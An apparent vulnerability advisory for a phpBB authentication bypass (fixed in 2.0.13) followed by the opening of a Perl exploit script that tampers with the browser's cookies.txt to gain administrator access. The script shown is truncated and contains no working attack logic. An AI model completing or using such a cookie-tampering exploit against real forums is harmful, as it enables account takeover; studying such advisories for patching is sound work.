phpBB is affected by an authentication bypass vulnerability.

This issue is due to the application failing to properly sanitize user-supplied input during authentication.

Exploitation of this vulnerability would permit unauthorized access to any known account including the administrator account.

The vendor has addressed this issue in phpBB 2.0.13.

#  I tested this code with Firefox on my linux box, I do not know if it works
with mozilla or on #windows
#  $url is the name of the cookie ( www.phpbb.com / $url= phpbb.com ) Look at
cookies.txt for the name of the cookie

#  I wrote this exploit after reading "phpBB 2.0.12 Session Handling
Administrator Authentication #Bypass    -SIMPLIFIED-"  By PPC^Rebyte
#  and it is based on his code
#
# Sorry for my bad english :/

$file = "/////cookies.txt" ; # path to your cookies.txt
$url = $ARGV[0];

open (FILE , '<'."$file" ) or die ('File does not exist')  ; # path to your

close FILE ;
